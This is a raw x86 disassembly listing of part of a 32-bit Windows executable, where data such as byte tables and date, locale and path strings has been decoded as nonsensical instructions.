  40c07a:	xor    dh,BYTE PTR [ebx]
  40c07c:	xor    al,0x35
  40c07e:	ss aaa 
  40c080:	cmp    BYTE PTR [ecx],bh
  40c082:	cmp    bh,BYTE PTR [ebx]
  40c084:	cmp    al,0x3d
  40c086:	ds aas 
  40c088:	inc    eax
  40c089:	popa   
  40c08a:	bound  esp,QWORD PTR [ebx+0x64]
  40c08d:	gs addr16 pushw 0x6a69
  40c093:	imul   ebp,DWORD PTR [ebp+ebp*2+0x6e],0x6f
  40c098:	jo     0x40c10b
  40c09a:	jb     0x40c10f
  40c09c:	je     0x40c113
  40c09e:	jbe    0x40c117
  40c0a0:	js     0x40c11b
  40c0a2:	jp     0x40c0ff
  40c0a4:	pop    esp
  40c0a5:	pop    ebp
  40c0a6:	pop    esi
  40c0a7:	pop    edi
  40c0a8:	pusha  
  40c0a9:	popa   
  40c0aa:	bound  esp,QWORD PTR [ebx+0x64]
  40c0ad:	gs addr16 pushw 0x6a69
  40c0b3:	imul   ebp,DWORD PTR [ebp+ebp*2+0x6e],0x6f
  40c0b8:	jo     0x40c12b
  40c0ba:	jb     0x40c12f
  40c0bc:	je     0x40c133
  40c0be:	jbe    0x40c137
  40c0c0:	js     0x40c13b
  40c0c2:	jp     0x40c13f
  40c0c4:	jl     0x40c143
  40c0c6:	jle    0x40c147
  40c0c8:	add    BYTE PTR [ecx-0x7a7b7c7e],0x86
  40c0cf:	xchg   DWORD PTR [eax-0x73747577],ecx
  40c0d5:	lea    ecx,[esi-0x6d6e6f71]
  40c0db:	xchg   ebx,eax
  40c0dc:	xchg   esp,eax
  40c0dd:	xchg   ebp,eax
  40c0de:	xchg   esi,eax
  40c0df:	xchg   edi,eax
  40c0e0:	cwde   
  40c0e1:	cdq    
  40c0e2:	call   0xa09f:0x9e9d9c9b
  40c0e9:	mov    eax,ds:0xa5a4a3a2
  40c0ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0f0:	test   al,0xa9
  40c0f2:	stos   BYTE PTR es:[edi],al
  40c0f3:	stos   DWORD PTR es:[edi],eax
  40c0f4:	lods   al,BYTE PTR ds:[esi]
  40c0f5:	lods   eax,DWORD PTR ds:[esi]
  40c0f6:	scas   al,BYTE PTR es:[edi]
  40c0f7:	scas   eax,DWORD PTR es:[edi]
  40c0f8:	mov    al,0xb1
  40c0fa:	mov    dl,0xb3
  40c0fc:	mov    ah,0xb5
  40c0fe:	mov    dh,0xb7
  40c100:	mov    eax,0xbcbbbab9
  40c105:	mov    ebp,0xc1c0bfbe
  40c10a:	ret    0xc4c3
  40c10d:	(bad)
  40c110:	enter  0xcac9,0xcb
  40c114:	int3   
  40c115:	int    0xce
  40c117:	iret   
  40c118:	rcl    cl,1
  40c11a:	rcl    bl,cl
  40c11c:	aam    0xd5
  40c11e:	(bad)  
  40c11f:	xlat   BYTE PTR ds:[ebx]
  40c120:	fcomp  st(1)
  40c122:	fcmovu st,st(3)
  40c124:	(bad)  
  40c126:	(bad)  
  40c128:	loopne 0x40c10b
  40c12a:	loop   0x40c10f
  40c12c:	in     al,0xe5
  40c12e:	out    0xe7,al
  40c130:	call   0xed2cac1e
  40c135:	in     eax,dx
  40c136:	out    dx,al
  40c137:	out    dx,eax
  40c138:	lock icebp 
  40c13a:	repnz repz hlt 
  40c13d:	cmc    
  40c13e:	div    bh
  40c140:	clc    
  40c141:	stc    
  40c142:	cli    
  40c143:	sti    
  40c144:	cld    
  40c145:	std    
  40c146:	(bad)  
  40c147:	inc    DWORD PTR [eax-0x7b7c7d7f]
  40c14d:	test   DWORD PTR [esi-0x75767779],eax
  40c153:	mov    ecx,DWORD PTR [ebp+ecx*4-0x6e6f7072]
  40c15a:	xchg   edx,eax
  40c15b:	xchg   ebx,eax
  40c15c:	xchg   esp,eax
  40c15d:	xchg   ebp,eax
  40c15e:	xchg   esi,eax
  40c15f:	xchg   edi,eax
  40c160:	cwde   
  40c161:	cdq    
  40c162:	call   0xa09f:0x9e9d9c9b
  40c169:	mov    eax,ds:0xa5a4a3a2
  40c16e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c16f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c170:	test   al,0xa9
  40c172:	stos   BYTE PTR es:[edi],al
  40c173:	stos   DWORD PTR es:[edi],eax
  40c174:	lods   al,BYTE PTR ds:[esi]
  40c175:	lods   eax,DWORD PTR ds:[esi]
  40c176:	scas   al,BYTE PTR es:[edi]
  40c177:	scas   eax,DWORD PTR es:[edi]
  40c178:	mov    al,0xb1
  40c17a:	mov    dl,0xb3
  40c17c:	mov    ah,0xb5
  40c17e:	mov    dh,0xb7
  40c180:	mov    eax,0xbcbbbab9
  40c185:	mov    ebp,0xc1c0bfbe
  40c18a:	ret    0xc4c3
  40c18d:	(bad)
  40c190:	enter  0xcac9,0xcb
  40c194:	int3   
  40c195:	int    0xce
  40c197:	iret   
  40c198:	rcl    cl,1
  40c19a:	rcl    bl,cl
  40c19c:	aam    0xd5
  40c19e:	(bad)  
  40c19f:	xlat   BYTE PTR ds:[ebx]
  40c1a0:	fcomp  st(1)
  40c1a2:	fcmovu st,st(3)
  40c1a4:	(bad)  
  40c1a6:	(bad)  
  40c1a8:	loopne 0x40c18b
  40c1aa:	loop   0x40c18f
  40c1ac:	in     al,0xe5
  40c1ae:	out    0xe7,al
  40c1b0:	call   0xed2cac9e
  40c1b5:	in     eax,dx
  40c1b6:	out    dx,al
  40c1b7:	out    dx,eax
  40c1b8:	lock icebp 
  40c1ba:	repnz repz hlt 
  40c1bd:	cmc    
  40c1be:	div    bh
  40c1c0:	clc    
  40c1c1:	stc    
  40c1c2:	cli    
  40c1c3:	sti    
  40c1c4:	cld    
  40c1c5:	std    
  40c1c6:	(bad)  
  40c1c7:	inc    DWORD PTR [eax]
  40c1c9:	add    DWORD PTR [edx],eax
  40c1cb:	add    eax,DWORD PTR [eax*1+0x9080706]
  40c1d2:	or     cl,BYTE PTR [ebx]
  40c1d4:	or     al,0xd
  40c1d6:	push   cs
  40c1d7:	movups xmm2,XMMWORD PTR [ecx]
  40c1da:	adc    dl,BYTE PTR [ebx]
  40c1dc:	adc    al,0x15
  40c1de:	push   ss
  40c1df:	pop    ss
  40c1e0:	sbb    BYTE PTR [ecx],bl
  40c1e2:	sbb    bl,BYTE PTR [ebx]
  40c1e4:	sbb    al,0x1d
  40c1e6:	push   ds
  40c1e7:	pop    ds
  40c1e8:	and    BYTE PTR [ecx],ah
  40c1ea:	and    ah,BYTE PTR [ebx]
  40c1ec:	and    al,0x25
  40c1ee:	es daa 
  40c1f0:	sub    BYTE PTR [ecx],ch
  40c1f2:	sub    ch,BYTE PTR [ebx]
  40c1f4:	sub    al,0x2d
  40c1f6:	cs das 
  40c1f8:	xor    BYTE PTR [ecx],dh
  40c1fa:	xor    dh,BYTE PTR [ebx]
  40c1fc:	xor    al,0x35
  40c1fe:	ss aaa 
  40c200:	cmp    BYTE PTR [ecx],bh
  40c202:	cmp    bh,BYTE PTR [ebx]
  40c204:	cmp    al,0x3d
  40c206:	ds aas 
  40c208:	inc    eax
  40c209:	inc    ecx
  40c20a:	inc    edx
  40c20b:	inc    ebx
  40c20c:	inc    esp
  40c20d:	inc    ebp
  40c20e:	inc    esi
  40c20f:	inc    edi
  40c210:	dec    eax
  40c211:	dec    ecx
  40c212:	dec    edx
  40c213:	dec    ebx
  40c214:	dec    esp
  40c215:	dec    ebp
  40c216:	dec    esi
  40c217:	dec    edi
  40c218:	push   eax
  40c219:	push   ecx
  40c21a:	push   edx
  40c21b:	push   ebx
  40c21c:	push   esp
  40c21d:	push   ebp
  40c21e:	push   esi
  40c21f:	push   edi
  40c220:	pop    eax
  40c221:	pop    ecx
  40c222:	pop    edx
  40c223:	pop    ebx
  40c224:	pop    esp
  40c225:	pop    ebp
  40c226:	pop    esi
  40c227:	pop    edi
  40c228:	pusha  
  40c229:	inc    ecx
  40c22a:	inc    edx
  40c22b:	inc    ebx
  40c22c:	inc    esp
  40c22d:	inc    ebp
  40c22e:	inc    esi
  40c22f:	inc    edi
  40c230:	dec    eax
  40c231:	dec    ecx
  40c232:	dec    edx
  40c233:	dec    ebx
  40c234:	dec    esp
  40c235:	dec    ebp
  40c236:	dec    esi
  40c237:	dec    edi
  40c238:	push   eax
  40c239:	push   ecx
  40c23a:	push   edx
  40c23b:	push   ebx
  40c23c:	push   esp
  40c23d:	push   ebp
  40c23e:	push   esi
  40c23f:	push   edi
  40c240:	pop    eax
  40c241:	pop    ecx
  40c242:	pop    edx
  40c243:	jnp    0x40c2c1
  40c245:	jge    0x40c2c5
  40c247:	jg     0x40c1c9
  40c249:	add    DWORD PTR [edx-0x797a7b7d],0x8a898887
  40c253:	mov    ecx,DWORD PTR [ebp+ecx*4-0x6e6f7072]
  40c25a:	xchg   edx,eax
  40c25b:	xchg   ebx,eax
  40c25c:	xchg   esp,eax
  40c25d:	xchg   ebp,eax
  40c25e:	xchg   esi,eax
  40c25f:	xchg   edi,eax
  40c260:	cwde   
  40c261:	cdq    
  40c262:	call   0xa09f:0x9e9d9c9b
  40c269:	mov    eax,ds:0xa5a4a3a2
  40c26e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c26f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c270:	test   al,0xa9
  40c272:	stos   BYTE PTR es:[edi],al
  40c273:	stos   DWORD PTR es:[edi],eax
  40c274:	lods   al,BYTE PTR ds:[esi]
  40c275:	lods   eax,DWORD PTR ds:[esi]
  40c276:	scas   al,BYTE PTR es:[edi]
  40c277:	scas   eax,DWORD PTR es:[edi]
  40c278:	mov    al,0xb1
  40c27a:	mov    dl,0xb3
  40c27c:	mov    ah,0xb5
  40c27e:	mov    dh,0xb7
  40c280:	mov    eax,0xbcbbbab9
  40c285:	mov    ebp,0xc1c0bfbe
  40c28a:	ret    0xc4c3
  40c28d:	(bad)
  40c290:	enter  0xcac9,0xcb
  40c294:	int3   
  40c295:	int    0xce
  40c297:	iret   
  40c298:	rcl    cl,1
  40c29a:	rcl    bl,cl
  40c29c:	aam    0xd5
  40c29e:	(bad)  
  40c29f:	xlat   BYTE PTR ds:[ebx]
  40c2a0:	fcomp  st(1)
  40c2a2:	fcmovu st,st(3)
  40c2a4:	(bad)  
  40c2a6:	(bad)  
  40c2a8:	loopne 0x40c28b
  40c2aa:	loop   0x40c28f
  40c2ac:	in     al,0xe5
  40c2ae:	out    0xe7,al
  40c2b0:	call   0xed2cad9e
  40c2b5:	in     eax,dx
  40c2b6:	out    dx,al
  40c2b7:	out    dx,eax
  40c2b8:	lock icebp 
  40c2ba:	repnz repz hlt 
  40c2bd:	cmc    
  40c2be:	div    bh
  40c2c0:	clc    
  40c2c1:	stc    
  40c2c2:	cli    
  40c2c3:	sti    
  40c2c4:	cld    
  40c2c5:	std    
  40c2c6:	(bad)  
  40c2c7:	dec    DWORD PTR [eax+0x48]
  40c2ca:	cmp    ch,BYTE PTR [ebp+0x6d]
  40c2cd:	cmp    dh,BYTE PTR [ebx+0x73]
  40c2d0:	add    BYTE PTR [eax],al
  40c2d2:	add    BYTE PTR [eax],al
  40c2d4:	fs fs fs fs sub al,0x20
  40c2da:	dec    ebp
  40c2db:	dec    ebp
  40c2dc:	dec    ebp
  40c2dd:	dec    ebp
  40c2de:	and    BYTE PTR [esp+eiz*2+0x2c],ah
  40c2e2:	and    BYTE PTR [ecx+0x79],bh
  40c2e5:	jns    0x40c360
  40c2e7:	add    BYTE PTR [ebp+0x4d],cl
  40c2ea:	das    
  40c2eb:	fs fs das 
  40c2ee:	jns    0x40c369
  40c2f0:	add    BYTE PTR [eax],al
  40c2f2:	add    BYTE PTR [eax],al
  40c2f4:	push   eax
  40c2f5:	dec    ebp
  40c2f6:	add    BYTE PTR [eax],al
  40c2f8:	inc    ecx
  40c2f9:	dec    ebp
  40c2fa:	add    BYTE PTR [eax],al
  40c2fc:	inc    esp
  40c2fd:	arpl   WORD PTR gs:[ebp+0x6d],sp
  40c301:	bound  esp,QWORD PTR [ebp+0x72]
  40c304:	add    BYTE PTR [eax],al
  40c306:	add    BYTE PTR [eax],al
  40c308:	dec    esi
  40c309:	outs   dx,DWORD PTR ds:[esi]
  40c30a:	jbe    0x40c371
  40c30c:	ins    DWORD PTR es:[edi],dx
  40c30d:	bound  esp,QWORD PTR [ebp+0x72]
  40c310:	add    BYTE PTR [eax],al
  40c312:	add    BYTE PTR [eax],al
  40c314:	dec    edi
  40c315:	arpl   WORD PTR [edi+ebp*2+0x62],si
  40c319:	gs jb  0x40c31c
  40c31c:	push   ebx
  40c31d:	gs jo  0x40c394
  40c320:	gs ins DWORD PTR es:[edi],dx
  40c322:	bound  esp,QWORD PTR [ebp+0x72]
  40c325:	add    BYTE PTR [eax],al
  40c327:	add    BYTE PTR [ecx+0x75],al
  40c32a:	addr16 jne 0x40c3a0
  40c32d:	je     0x40c32f
  40c32f:	add    BYTE PTR [edx+0x75],cl
  40c332:	ins    BYTE PTR es:[edi],dx
  40c333:	jns    0x40c335
  40c335:	add    BYTE PTR [eax],al
  40c337:	add    BYTE PTR [edx+0x75],cl
  40c33a:	outs   dx,BYTE PTR ds:[esi]
  40c33b:	add    BYTE PTR gs:[eax],al
  40c33e:	add    BYTE PTR [eax],al
  40c340:	inc    ecx
  40c341:	jo     0x40c3b5
  40c343:	imul   ebp,DWORD PTR [eax+eax*1+0x0],0x72614d00
  40c34b:	arpl   WORD PTR [eax+0x0],bp
  40c34e:	add    BYTE PTR [eax],al
  40c350:	inc    esi
  40c351:	bound  esi,QWORD PTR gs:[edx+0x75]
  40c355:	popa   
  40c356:	jb     0x40c3d1
  40c358:	add    BYTE PTR [eax],al
  40c35a:	add    BYTE PTR [eax],al
  40c35c:	dec    edx
  40c35d:	popa   
  40c35e:	outs   dx,BYTE PTR ds:[esi]
  40c35f:	jne    0x40c3c2
  40c361:	jb     0x40c3dc
  40c363:	add    BYTE PTR [ebp+eiz*2+0x63],al
  40c367:	add    BYTE PTR [esi+0x6f],cl
  40c36a:	jbe    0x40c36c
  40c36c:	dec    edi
  40c36d:	arpl   WORD PTR [eax+eax*1+0x53],si
  40c371:	gs jo  0x40c374
  40c374:	inc    ecx
  40c375:	jne    0x40c3de
  40c377:	add    BYTE PTR [edx+0x75],cl
  40c37a:	ins    BYTE PTR es:[edi],dx
  40c37b:	add    BYTE PTR [edx+0x75],cl
  40c37e:	outs   dx,BYTE PTR ds:[esi]
  40c37f:	add    BYTE PTR [ebp+0x61],cl
  40c382:	jns    0x40c384
  40c384:	inc    ecx
  40c385:	jo     0x40c3f9
  40c387:	add    BYTE PTR [ebp+0x61],cl
  40c38a:	jb     0x40c38c
  40c38c:	inc    esi
  40c38d:	bound  eax,QWORD PTR gs:[eax]
  40c390:	dec    edx
  40c391:	popa   
  40c392:	outs   dx,BYTE PTR ds:[esi]
  40c393:	add    BYTE PTR [ebx+0x61],dl
  40c396:	je     0x40c40d
  40c398:	jb     0x40c3fe
  40c39a:	popa   
  40c39b:	jns    0x40c39d
  40c39d:	add    BYTE PTR [eax],al
  40c39f:	add    BYTE PTR [esi+0x72],al
  40c3a2:	imul   esp,DWORD PTR [ecx+eiz*2+0x79],0x68540000
  40c3aa:	jne    0x40c41e
  40c3ac:	jae    0x40c412
  40c3ae:	popa   
  40c3af:	jns    0x40c3b1
  40c3b1:	add    BYTE PTR [eax],al
  40c3b3:	add    BYTE PTR [edi+0x65],dl
  40c3b6:	outs   dx,BYTE PTR fs:[esi]
  40c3b8:	gs jae 0x40c41f
  40c3bb:	popa   
  40c3bc:	jns    0x40c3be
  40c3be:	add    BYTE PTR [eax],al
  40c3c0:	push   esp
  40c3c1:	jne    0x40c428
  40c3c3:	jae    0x40c429
  40c3c5:	popa   
  40c3c6:	jns    0x40c3c8
  40c3c8:	dec    ebp
  40c3c9:	outs   dx,DWORD PTR ds:[esi]
  40c3ca:	outs   dx,BYTE PTR ds:[esi]
  40c3cb:	fs popa 
  40c3cd:	jns    0x40c3cf
  40c3cf:	add    BYTE PTR [ebx+0x75],dl
  40c3d2:	outs   dx,BYTE PTR ds:[esi]
  40c3d3:	fs popa 
  40c3d5:	jns    0x40c3d7
  40c3d7:	add    BYTE PTR [ebx+0x61],dl
  40c3da:	je     0x40c3dc
  40c3dc:	inc    esi
  40c3dd:	jb     0x40c448
  40c3df:	add    BYTE PTR [eax+ebp*2+0x75],dl
  40c3e3:	add    BYTE PTR [edi+0x65],dl
  40c3e6:	add    BYTE PTR fs:[ebp+esi*2+0x65],dl
  40c3eb:	add    BYTE PTR [ebp+0x6f],cl
  40c3ee:	outs   dx,BYTE PTR ds:[esi]
  40c3ef:	add    BYTE PTR [ebx+0x75],dl
  40c3f2:	outs   dx,BYTE PTR ds:[esi]
  40c3f3:	add    BYTE PTR [eax],al
  40c3f5:	add    BYTE PTR [eax],al
  40c3f7:	add    BYTE PTR [esi],al
  40c3f9:	add    BYTE PTR [eax-0x7f7e7f7a],0x0
  40c400:	add    BYTE PTR [eax],dl
  40c402:	add    eax,DWORD PTR [esi-0x7f7d7980]
  40c408:	adc    al,0x5
  40c40a:	add    eax,0x85454545
  40c40f:	test   DWORD PTR [ebp+0x30000005],eax
  40c415:	xor    BYTE PTR [eax+0x888050],al
  40c41b:	or     BYTE PTR [eax],al
  40c41d:	sub    BYTE PTR [edi],ah
  40c41f:	cmp    BYTE PTR [eax+0x57],dl
  40c422:	add    BYTE PTR [eax],0x7
  40c425:	add    BYTE PTR [edi],dh
  40c427:	xor    BYTE PTR [eax],dh
  40c429:	push   eax
  40c42a:	push   eax
  40c42b:	mov    BYTE PTR [eax],al
  40c42d:	add    BYTE PTR [eax],al
  40c42f:	and    BYTE PTR [eax],ch
  40c431:	or     BYTE PTR [eax+0x8080],0x0
  40c438:	pusha  
  40c439:	push   0x68686860
  40c43e:	or     BYTE PTR [eax],cl
  40c440:	pop    es
  40c441:	js     0x40c4b3
  40c443:	jo     0x40c4bc
  40c445:	jo     0x40c4b7
  40c447:	or     BYTE PTR [eax],cl
  40c449:	add    BYTE PTR [eax],al
  40c44b:	or     BYTE PTR [eax],al
  40c44d:	or     BYTE PTR [eax],al
  40c44f:	pop    es
  40c450:	or     BYTE PTR [eax],al
  40c452:	add    BYTE PTR [eax],al
  40c454:	inc    ebx
  40c455:	dec    edi
  40c456:	dec    esi
  40c457:	dec    edi
  40c458:	push   ebp
  40c459:	push   esp
  40c45a:	and    al,0x0
  40c45c:	push   ebx
  40c45d:	jne    0x40c4cd
  40c45f:	dec    ebp
  40c460:	outs   dx,DWORD PTR ds:[esi]
  40c461:	outs   dx,BYTE PTR ds:[esi]
  40c462:	push   esp
  40c463:	jne    0x40c4ca
  40c465:	push   edi
  40c466:	gs fs push esp
  40c469:	push   0x69724675
  40c46e:	push   ebx
  40c46f:	popa   
  40c470:	je     0x40c472
  40c472:	add    BYTE PTR [eax],al
  40c474:	dec    edx
  40c475:	popa   
  40c476:	outs   dx,BYTE PTR ds:[esi]
  40c477:	inc    esi
  40c478:	bound  ecx,QWORD PTR gs:[ebp+0x61]
  40c47c:	jb     0x40c4bf
  40c47e:	jo     0x40c4f2
  40c480:	dec    ebp
  40c481:	popa   
  40c482:	jns    0x40c4ce
  40c484:	jne    0x40c4f4
  40c486:	dec    edx
  40c487:	jne    0x40c4f5
  40c489:	inc    ecx
  40c48a:	jne    0x40c4f3
  40c48c:	push   ebx
  40c48d:	gs jo  0x40c4df
  40c490:	arpl   WORD PTR [esi+ecx*2+0x6f],si
  40c494:	jbe    0x40c4da
  40c496:	arpl   WORD PTR gs:[eax],ax
  40c499:	add    BYTE PTR [eax],al
  40c49b:	add    BYTE PTR [eax+eax*1+0x4c],bl
  40c49f:	add    BYTE PTR [ecx+0x0],ah
  40c4a2:	outs   dx,BYTE PTR ds:[esi]
  40c4a3:	add    BYTE PTR [edi+0x0],ah
  40c4a6:	pop    esp
	...
  40c4af:	add    BYTE PTR [eax+eax*1+0x4c],bl
  40c4b3:	add    BYTE PTR [ecx+0x0],ah
  40c4b6:	outs   dx,BYTE PTR ds:[esi]
  40c4b7:	add    BYTE PTR [edi+0x0],ah
  40c4ba:	pop    esp
  40c4bb:	add    BYTE PTR [eax+eax*1+0x65],ah
  40c4bf:	add    BYTE PTR [esi+0x0],ah
  40c4c2:	popa   
  40c4c3:	add    BYTE PTR [ebp+0x0],dh
  40c4c6:	ins    BYTE PTR es:[edi],dx
  40c4c7:	add    BYTE PTR [eax+eax*1+0x2e],dh
  40c4cb:	add    BYTE PTR [eax+eax*1+0x6e],ch
  40c4cf:	add    BYTE PTR [edi+0x0],ah
  40c4d2:	add    BYTE PTR [eax],al
  40c4d4:	pop    esp
  40c4d5:	add    BYTE PTR [eax+0x0],ch
  40c4d8:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  40c4dd:	add    BYTE PTR [eax+eax*1+0x0],bl
  40c4e1:	add    BYTE PTR [eax],al
  40c4e3:	add    BYTE PTR [eax+eax*1],dh
  40c4e6:	add    BYTE PTR [eax],al
  40c4e8:	dec    esp
  40c4e9:	add    BYTE PTR [ecx+0x0],al
  40c4ec:	dec    esi
  40c4ed:	add    BYTE PTR [edi+0x0],al
  40c4f0:	push   ebp
  40c4f1:	add    BYTE PTR [ecx+0x0],al
  40c4f4:	inc    edi
  40c4f5:	add    BYTE PTR [ebp+0x0],al
  40c4f8:	add    BYTE PTR [eax],al
  40c4fa:	add    BYTE PTR [eax],al
  40c4fc:	and    eax,0x5c007300
  40c501:	add    BYTE PTR ds:0x7300,ah
  40c507:	add    BYTE PTR [eax+eax*1+0x64],bl
  40c50b:	add    BYTE PTR [ebp+0x0],ah
  40c50e:	data16 add BYTE PTR [ecx+0x0],ah
  40c512:	jne    0x40c514
  40c514:	ins    BYTE PTR es:[edi],dx
  40c515:	add    BYTE PTR [eax+eax*1+0x2e],dh
  40c519:	add    BYTE PTR [eax+eax*1+0x6e],ch
  40c51d:	add    BYTE PTR [edi+0x0],ah
  40c520:	add    BYTE PTR [eax],al
  40c522:	add    BYTE PTR [eax],al
  40c524:	and    eax,0x25007300
  40c529:	add    BYTE PTR [ebx+0x0],dh
  40c52c:	add    BYTE PTR [eax],al
  40c52e:	add    BYTE PTR [eax],al
  40c530:	push   edi
  40c531:	add    BYTE PTR [ecx+0x0],cl
  40c534:	dec    esi
  40c535:	add    BYTE PTR [eax+eax*1+0x4f],dl
  40c539:	add    BYTE PTR [edi+0x0],cl
  40c53c:	dec    esp
  40c53d:	add    BYTE PTR [ebx+0x0],dl
  40c540:	dec    esi
  40c541:	add    BYTE PTR [ebp+0x0],al
  40c544:	push   esp
  40c545:	add    BYTE PTR [ebx+0x0],al
  40c548:	dec    esp
  40c549:	add    BYTE PTR [ecx+0x0],al
  40c54c:	push   ebx
  40c54d:	add    BYTE PTR [ebx+0x0],dl
  40c550:	add    BYTE PTR [eax],al
  40c552:	add    BYTE PTR [eax],al
  40c554:	ja     0x40c556
  40c556:	imul   eax,DWORD PTR [eax],0x74006e
  40c55c:	outs   dx,DWORD PTR ds:[esi]
  40c55d:	add    BYTE PTR [edi+0x0],ch
  40c560:	ins    BYTE PTR es:[edi],dx
  40c561:	add    BYTE PTR [ebx+0x0],dh
  40c564:	outs   dx,BYTE PTR ds:[esi]
  40c565:	add    BYTE PTR [ebp+0x0],ah
  40c568:	je     0x40c56a
  40c56a:	add    BYTE PTR cs:[ebp+0x0],ah
  40c56e:	js     0x40c570
  40c570:	add    BYTE PTR gs:[eax],al
  40c573:	add    BYTE PTR [ebx+0x0],dh
  40c576:	je     0x40c578
  40c578:	popa   
  40c579:	add    BYTE PTR [eax+eax*1+0x69],dh
  40c57d:	add    BYTE PTR [ebx+0x0],ah
  40c580:	add    BYTE PTR [eax],al
  40c582:	add    BYTE PTR [eax],al
  40c584:	push   ebx
  40c585:	add    BYTE PTR [ebp+0x0],ah
  40c588:	ins    BYTE PTR es:[edi],dx
  40c589:	add    BYTE PTR [ebp+0x0],ah
  40c58c:	arpl   WORD PTR [eax],ax
  40c58e:	je     0x40c590
  40c590:	and    BYTE PTR [eax],al
  40c592:	outs   dx,BYTE PTR ds:[esi]
  40c593:	add    BYTE PTR [ecx+0x0],ah
  40c596:	je     0x40c598
  40c598:	imul   eax,DWORD PTR [eax],0x650076
  40c59e:	and    BYTE PTR [eax],al
  40c5a0:	ins    BYTE PTR es:[edi],dx
  40c5a1:	add    BYTE PTR [ecx+0x0],ah
  40c5a4:	outs   dx,BYTE PTR ds:[esi]
  40c5a5:	add    BYTE PTR [edi+0x0],ah
  40c5a8:	jne    0x40c5aa
  40c5aa:	popa   
  40c5ab:	add    BYTE PTR [edi+0x0],ah
  40c5ae:	add    BYTE PTR gs:[eax],al
  40c5b1:	add    BYTE PTR [eax],al
  40c5b3:	add    BYTE PTR [edx+0x0],ah
  40c5b6:	jne    0x40c5b8
  40c5b8:	je     0x40c5ba
  40c5ba:	je     0x40c5bc
  40c5bc:	outs   dx,DWORD PTR ds:[esi]
  40c5bd:	add    BYTE PTR [esi+0x0],ch
  40c5c0:	add    BYTE PTR [eax],al
  40c5c2:	add    BYTE PTR [eax],al
  40c5c4:	add    BYTE PTR es:[ecx+0x0],al
  40c5c8:	jo     0x40c5ca
  40c5ca:	jo     0x40c5cc
  40c5cc:	ins    BYTE PTR es:[edi],dx
  40c5cd:	add    BYTE PTR [ecx+0x0],bh
  40c5d0:	add    BYTE PTR [eax],al
  40c5d2:	add    BYTE PTR [eax],al
  40c5d4:	add    BYTE PTR es:[ebx+0x0],al
  40c5d8:	popa   
  40c5d9:	add    BYTE PTR [esi+0x0],ch
  40c5dc:	arpl   WORD PTR [eax],ax
  40c5de:	add    BYTE PTR gs:[eax+eax*1+0x0],ch
  40c5e3:	add    BYTE PTR [esi],ah
  40c5e5:	add    BYTE PTR [eax+0x0],cl
  40c5e8:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  40c5ed:	add    BYTE PTR [eax],al
  40c5ef:	add    BYTE PTR [ebx+0x0],dl
  40c5f2:	add    BYTE PTR gs:[eax+eax*1+0x65],ch
  40c5f7:	add    BYTE PTR [ebx+0x0],ah
  40c5fa:	je     0x40c5fc
  40c5fc:	imul   eax,DWORD PTR [eax],0x6e006f
  40c602:	cmp    al,BYTE PTR [eax]
  40c604:	add    BYTE PTR [eax],al
  40c606:	add    BYTE PTR [eax],al
  40c608:	inc    ebx
  40c609:	add    BYTE PTR [edi+0x0],ch
  40c60c:	ins    DWORD PTR es:[edi],dx
  40c60d:	add    BYTE PTR [edx+0x0],ah
  40c610:	outs   dx,DWORD PTR ds:[esi]
  40c611:	add    BYTE PTR [edx+0x0],al
  40c614:	outs   dx,DWORD PTR ds:[esi]
  40c615:	add    BYTE PTR [eax+0x0],bh
  40c618:	inc    ebp
  40c619:	add    BYTE PTR [eax+0x0],bh
  40c61c:	xor    eax,DWORD PTR [eax]
  40c61e:	xor    al,BYTE PTR [eax]
  40c620:	add    BYTE PTR [eax],al
  40c622:	add    BYTE PTR [eax],al
  40c624:	and    BYTE PTR [eax],al
  40c626:	push   ebx
  40c627:	add    BYTE PTR [ebp+0x0],ah
  40c62a:	ins    BYTE PTR es:[edi],dx
  40c62b:	add    BYTE PTR [ebp+0x0],ah
  40c62e:	arpl   WORD PTR [eax],ax
  40c630:	je     0x40c632
  40c632:	and    BYTE PTR [eax],al
  40c634:	dec    esp
  40c635:	add    BYTE PTR [ecx+0x0],ah
  40c638:	outs   dx,BYTE PTR ds:[esi]
  40c639:	add    BYTE PTR [edi+0x0],ah
  40c63c:	jne    0x40c63e
  40c63e:	popa   
  40c63f:	add    BYTE PTR [edi+0x0],ah
  40c642:	add    BYTE PTR gs:[eax],al
  40c645:	add    BYTE PTR [eax],al
  40c647:	add    BYTE PTR [edx],ch
  40c649:	add    BYTE PTR [eax],al
  40c64b:	add    BYTE PTR [eax+eax*1+0x65],ah
  40c64f:	add    BYTE PTR [esi+0x0],ah
  40c652:	popa   
  40c653:	add    BYTE PTR [ebp+0x0],dh
  40c656:	ins    BYTE PTR es:[edi],dx
  40c657:	add    BYTE PTR [eax+eax*1+0x0],dh
  40c65b:	add    BYTE PTR [eax],dh
  40c65d:	add    BYTE PTR [eax],al
  40c65f:	add    BYTE PTR [ecx],dh
  40c661:	add    BYTE PTR [eax],al
  40c663:	add    BYTE PTR [edx],dh
  40c665:	add    BYTE PTR [eax],al
  40c667:	add    BYTE PTR [eax+0x0],cl
	...
  40c6a2:	add    BYTE PTR [eax],al
  40c6a4:	add    al,0xe0
  40c6a6:	inc    eax
  40c6a7:	add    BYTE PTR [eax],al
  40c6a9:	mov    DWORD PTR [eax+0x0],0x3
  40c6b0:	push   edx
  40c6b1:	push   ebx
  40c6b2:	inc    esp
  40c6b3:	push   ebx
  40c6b4:	dec    ebx
  40c6b5:	into   
  40c6b6:	inc    ebp
  40c6b7:	dec    ecx
  40c6b8:	sub    eax,0xa448c16f
  40c6bd:	push   ebx
  40c6be:	and    al,0xb5
  40c6c0:	shl    DWORD PTR [eax+0x18],cl
  40c6c3:	mov    DWORD PTR [ecx],eax
  40c6c5:	add    BYTE PTR [eax],al
  40c6c7:	add    BYTE PTR [edx+edi*1+0x5c],al
  40c6cb:	dec    ebp
  40c6cc:	jns    0x40c6ee
  40c6ce:	push   eax
  40c6cf:	jb     0x40c740
  40c6d1:	push   0x65
  40c6d3:	arpl   WORD PTR [ebx+esi*2+0x5c],si
  40c6d7:	ins    BYTE PTR es:[edi],dx
  40c6d8:	popa   
  40c6d9:	outs   dx,BYTE PTR ds:[esi]
  40c6da:	addr16 jne 0x40c73e
